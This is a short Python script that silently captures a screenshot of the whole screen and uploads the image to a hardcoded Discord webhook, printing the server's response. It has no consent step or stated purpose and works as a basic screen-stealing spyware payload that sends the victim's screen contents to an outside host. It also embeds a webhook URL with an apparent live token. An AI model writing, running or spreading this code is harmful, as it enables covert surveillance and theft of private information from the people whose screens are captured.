from PIL import ImageGrab
from pathlib import Path

desktop = Path.home() / "C:"
filename = desktop / "screen.png"

screenshot = ImageGrab.grab()
screenshot.save(filename)


import requests
from pathlib import Path

webhook_url = "https://discord.com/api/webhooks/1540810473975455935/wlZbS41k4nNXVySkTaeyMDKxfBdsDwEURzjSEUbe2v9iv4k0Bq17s1mgcT0tGiASqLdF"
file_path = Path.home() / "C:" / "screen.png"

with open(file_path, "rb") as image:
    response = requests.post(
        webhook_url,
        files={"file": ("screen.png", image, "image/png")}
    )

print(response.status_code)
print(response.text)